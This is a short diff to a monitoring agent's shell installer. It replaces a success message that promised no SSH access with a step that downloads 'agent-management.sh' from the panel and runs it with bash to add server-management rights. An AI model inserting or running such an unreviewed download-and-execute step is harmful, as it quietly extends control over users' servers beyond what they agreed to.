@@ -99,7 +99,10 @@ for attempt in {1..12}; do
  if claim && grep -qi '^X-Mxioc-Agent-Connected: true' "$stage/headers"; then
   # Keep the installation identity and config for idempotent reruns.
   chmod 600 "$state/client" "$state/config"
-  echo '接入成功：面板已收到心跳，服务器已自动加入列表。无需开放入站端口或提供 SSH 密码。'
+  echo '监控已接入，正在补齐默认服务器管理权限…'
+  curl -fsS --connect-timeout 15 --max-time 60 --proto '=https' "$origin/sub/agent-management.sh" -o "$stage/management.sh"
+  bash "$stage/management.sh"
+  echo '接入成功：监控与服务器管理已启用。'
   exit 0
  fi
  sleep 3
